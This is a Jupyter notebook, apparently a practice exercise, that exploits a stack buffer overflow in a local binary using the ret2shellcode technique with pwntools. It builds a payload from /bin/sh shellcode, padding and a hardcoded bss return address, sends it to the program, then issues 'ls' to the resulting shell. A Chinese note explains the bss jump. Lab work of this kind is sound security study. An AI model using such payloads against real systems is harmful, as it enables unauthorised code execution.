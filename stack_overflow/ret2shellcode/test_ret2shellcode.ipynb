{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "%load_ext autoreload\n",
    "%autoreload 2\n",
    "formatter = get_ipython().display_formatter.formatters['text/plain']\n",
    "formatter.for_type(int, lambda n, p, cycle: p.text(\"0x%X\" % n))\n",
    "\n",
    "import os\n",
    "os.sys.path.append('../../')\n",
    "\n",
    "from pwn import *\n",
    "from util import *\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "output_type": "error",
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[0;32m<ipython-input-10-0a238d91e46d>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[0;32m----> 1\u001b[0;31m \u001b[0mos\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mread\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mw_pipe\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;36m1\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
      "\u001b[0;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "os.read(w_pipe, 1)"
   ]
  },
  {
   "source": [
    "程序使用了strncpy函数将gets得到的字符串拷贝到bss段. 按理说bss段得是可执行段才能进行后续操作, 但实验中发现其非可执行段, 仍能进行后续操作, 让代码跳转到bss段上的shellcode并运行之.\n",
    "\n",
    "<img alt=\"bss\" src=\"./pic/bss.jpg\" width=\"60%\" height=\"60%\"> <br>\n",
    "\n",
    "下图为bss段上的shellcode反汇编后的样子.\n",
    "\n",
    "<img alt=\"shellcode\" src=\"./pic/shellcode.jpg\" width=\"45%\" height=\"45%\">\n",
    "\n",
    "\n"
   ],
   "cell_type": "markdown",
   "metadata": {}
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line2('1234567')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "shellcode = asm(shellcraft.sh())\n",
    "buf2_addr = 0x804a080\n",
    "\n",
    "payload = shellcode.ljust(0x90c - 0x89c, b'A') + p32(buf2_addr)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [],
   "source": [
    "write_pipe(payload + b'\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [],
   "source": [
    "send_line2('ls')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3",
   "language": "python"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.9-final"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}